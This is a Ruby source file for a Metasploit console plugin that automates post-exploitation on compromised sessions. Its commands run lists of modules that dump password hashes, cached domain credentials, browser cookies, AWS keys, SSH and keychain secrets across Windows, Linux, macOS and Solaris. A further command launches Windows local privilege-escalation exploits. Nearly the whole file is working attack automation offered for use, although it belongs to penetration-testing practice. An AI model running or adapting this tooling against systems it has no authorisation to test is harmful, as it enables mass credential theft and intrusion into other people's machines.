# Copyright (c) 2019
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted
# provided that the following conditions are met:
#
# Redistributions of source code must retain the above copyright notice, this list of conditions and
# the following disclaimer.
#
# Redistributions in binary form must reproduce the above copyright notice, this list of conditions
# and the following disclaimer in the documentation and/or other materials provided with the
# distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR
# IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
# FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER
# IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
# OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
module Msf
class Plugin::Pentest < Msf::Plugin

  # Post Exploitation command class
  ################################################################################################
  class CredentialsCommandDispatcher

    include Msf::Auxiliary::Report
    include Msf::Ui::Console::CommandDispatcher

    def name
      "Credentials"
    end

    def commands
      {
        "sys_creds"    => "Run system password collection modules against specified sessions.",
        "all_creds"    => "Run all password collection modules against specified sessions.",
        "win_privesc"  => "Execute some useful POST modules to find a way to escalate privileges in Windows",
      }
    end

    #Returns the sessions to execute modules, or error
    def get_opts_sessions(args)
      opts = Rex::Parser::Arguments.new(
        "-s"   => [ true, "Sessions to run modules against. Example <all> or <1,2,3,4>"],
        "-h"   => [ false,  "Command Help"]
      )
      error = "help"
      sessions = ""

      if args.length == 0
        print_line(opts.usage)
        return error
      end

      opts.parse(args) do |opt, idx, val|
        case opt
        when "-s"
          sessions = val
        when "-h"
          print_line(opts.usage)
          return error
        else
          print_line(opts.usage)
          return error
        end
      end
      return sessions
    end

    #Recieves list of post modules and sessions to execute them into
    def post_execute(post_list, sessions, expl=false)
      post_list.each do |p|
        if expl == true
          m = framework.exploits.create(p["mod"])
        else
          m = framework.post.create(p["mod"])
        end
        if m == nil
          print_error("Error creating m with: "+p["mod"])
          next
        end

        # Set Sessions to be processed
        if sessions =~ /all/i
          session_list = m.compatible_sessions
        else
          session_list = sessions.split(",")
        end
        session_list.each do |s|
          begin
            if m.session_compatible?(s.to_i)
              #If not valid platform, next
              next if (! p["mod"].downcase.include?(framework.sessions.get(s.to_i).platform.downcase)) && (! p["mod"].downcase.include?("multi/"))
              m.datastore['SESSION'] = s.to_i
              if p['opt']
                opt_pair = p['opt'].split("=",2)
                m.datastore[opt_pair[0]] = opt_pair[1]
              end
              m.options.validate(m.datastore)
              print_line("")
              print_line("========================================================================================")
              print_good("Running #{p['mod']} against #{s}")
              print_line("")
              if expl == true
                m.exploit()
              else
                m.run_simple( 'LocalInput'  => driver.input, 'LocalOutput' => driver.output )
              end
              print_line("----------------------------------------------------------------------------------------")
              print_line("")
            end
          rescue
            print_error("Could not run post module against sessions #{s}.")
          end
        end
      end
    end

    # software_creds Command
    #-------------------------------------------------------------------------------------------
    def cmd_all_creds(*args)
      # Parse options
      sessions = get_opts_sessions(args)
      return if sessions == "help"
      
      #Predefined modules
      cred_mods = [
        {"mod" => "linux/gather/ecryptfs_creds", "opt" => nil},
        {"mod" => "linux/gather/enum_psk", "opt" => nil},
        {"mod" => "linux/gather/gnome_commander_creds", "opt" => nil},
        {"mod" => "linux/gather/mount_cifs_creds", "opt" => nil},
        {"mod" => "linux/gather/openvpn_credentialss", "opt" => nil},
        {"mod" => "linux/gather/phpmyadmin_credsteal", "opt" => nil},
        {"mod" => "linux/gather/pptpd_chap_secrets", "opt" => nil},
        {"mod" => "linux/gather/hashdump", "opt" => nil},

        {"mod" => "multi/gather/aws_keys", "opt" => nil},
        {"mod" => "multi/gather/chrome_cookies", "opt" => nil},
        {"mod" => "multi/gather/docker_creds", "opt" => nil},
        {"mod" => "multi/gather/fetchmailrc_creds", "opt" => nil},
        {"mod" => "multi/gather/filezilla_client_cred", "opt" => nil},
        {"mod" => "multi/gather/firefox_creds", "opt" => nil},
        {"mod" => "multi/gather/gpg_creds", "opt" => nil},
        {"mod" => "multi/gather/irssi_creds", "opt" => nil},
        {"mod" => "multi/gather/jenkins_gather", "opt" => nil},
        #{"mod" => "multi/gather/lastpass_creds", "opt" => nil},  #This module breaks windows meterpreter connection
        {"mod" => "multi/gather/maven_creds", "opt" => nil},
        {"mod" => "multi/gather/netrc_creds", "opt" => nil},
        {"mod" => "multi/gather/pidgin_cred", "opt" => nil},
        {"mod" => "multi/gather/remmina_creds", "opt" => nil},
        {"mod" => "multi/gather/rsyncd_creds", "opt" => nil},
        {"mod" => "multi/gather/ssh_creds", "opt" => nil},
        {"mod" => "multi/gather/thunderbird_creds", "opt" => nil},
        {"mod" => "multi/gather/tomcat_gather", "opt" => nil},
        
        {"mod" => "osx/gather/apfs_encrypted_volume_passwd", "opt" => nil},
        {"mod" => "osx/gather/autologin_password", "opt" => nil},
        {"mod" => "osx/gather/enum_keychain", "opt" => nil},
        {"mod" => "osx/gather/hashdump", "opt" => nil},
        {"mod" => "osx/gather/vnc_password_osx", "opt" => nil},
        
        {"mod" => "solaris/gather/hashdump", "opt" => nil},

        {"mod" => "windows/gather/cachedump", "opt" => nil},
        {"mod" => "windows/gather/credentials/gpp", "opt" => nil},
        {"mod" => "windows/gather/enum_putty_saved_sessions", "opt" => nil},
        {"mod" => "windows/gather/enum_snmp", "opt" => nil},
        {"mod" => "windows/gather/enum_unattend", "opt" => nil},
        {"mod" => "windows/gather/hashdump", "opt" => nil},
        {"mod" => "windows/gather/smart_hashdump", "opt" => nil}
      ]
      ##Use also all gather/credential modules
      framework.post.keys.each do |p|
        if p.include?("/gather/credentials")
          cred_mods << { "mod" => p, "opt" => nil }
        end
      end

      #Execute post modules
      post_execute(cred_mods, sessions)
    end

    # win_privesc Command 
    #-------------------------------------------------------------------------------------------
    def cmd_win_privesc(*args)
      # Parse options
      sessions = get_opts_sessions(args)
      return if sessions == "help"

      #Predefined modules
      privesc_post = [
        {"mod" => "windows/gather/enum_patches", "opt" => nil},
        {"mod" => "multi/recon/local_exploit_suggester", "opt" => nil},
        {"mod" => "windows/escalate/getsystem", "opt" => nil},
      ]
      privesc_expls = [
        {"mod" => "windows/local/trusted_service_path", "opt" => nil},
        {"mod" => "windows/local/always_install_elevated", "opt" => nil},
        {"mod" => "windows/local/service_permissions", "opt" => nil}
      ]

      #Execute post modules
      post_execute(privesc_post, sessions)
      post_execute(privesc_expls, sessions, true)
    end

    # creds_sys Command
    #-------------------------------------------------------------------------------------------
    def cmd_sys_creds(*args)
      # Parse options
      sessions = get_opts_sessions(args)
      return if sessions == "help"

      #Predefined modules
      cred_mods = [
        {"mod" => "windows/gather/cachedump", "opt" => nil},
        {"mod" => "windows/gather/smart_hashdump", "opt" => "GETSYSTEM=true"},
        {"mod" => "windows/gather/credentials/gpp", "opt" => nil},
        {"mod" => "windows/gather/hashdump", "opt" => nil},
        {"mod" => "osx/gather/hashdump", "opt" => nil},
        {"mod" => "linux/gather/hashdump", "opt" => nil},
        {"mod" => "solaris/gather/hashdump", "opt" => nil},
      ]

      #Execute post modules
      post_execute(cred_mods, sessions)
    end
  end
    
#-------------------------------------------------------------------------------------------------
  def initialize(framework, opts)
    super
    if framework.db and framework.db.active
      add_console_dispatcher(CredentialsCommandDispatcher)

      archive_path =  ::File.join(Msf::Config.log_directory,"archives")
      project_paths = ::File.join(Msf::Config.log_directory,"projects")

      # Create project folder if first run
      if not ::File.directory?(project_paths)
        ::FileUtils.mkdir_p(project_paths)
      end

      # Create archive folder if first run
      if not ::File.directory?(archive_path)
        ::FileUtils.mkdir_p(archive_path)
      end
      banner = %{
        /$$$$$$                            /$$                       /$$     /$$           /$$          
        /$$__  $$                          | $$                      | $$    |__/          | $$          
       | $$  \__/  /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$  /$$$$$$$  /$$$$$$   /$$  /$$$$$$ | $$  /$$$$$$$
       | $$       /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$| $$__  $$|_  $$_/  | $$ |____  $$| $$ /$$_____/
       | $$      | $$  \__/| $$$$$$$$| $$  | $$| $$$$$$$$| $$  \ $$  | $$    | $$  /$$$$$$$| $$|  $$$$$$ 
       | $$    $$| $$      | $$_____/| $$  | $$| $$_____/| $$  | $$  | $$ /$$| $$ /$$__  $$| $$ \____  $$
       |  $$$$$$/| $$      |  $$$$$$$|  $$$$$$$|  $$$$$$$| $$  | $$  |  $$$$/| $$|  $$$$$$$| $$ /$$$$$$$/
        \______/ |__/       \_______/ \_______/ \_______/|__/  |__/   \___/  |__/ \_______/|__/|_______/ 
      }
      print_line banner
      print_line "Version 1.0"
    else
      print_error("This plugin requires the framework to be connected to a Database!")
    end
  end

  def cleanup
    remove_console_dispatcher('Credentials')
  end

  def name
    "Credentials"
  end

  def desc
    "Plugin for automatic password gathering."
  end
protected
end
end
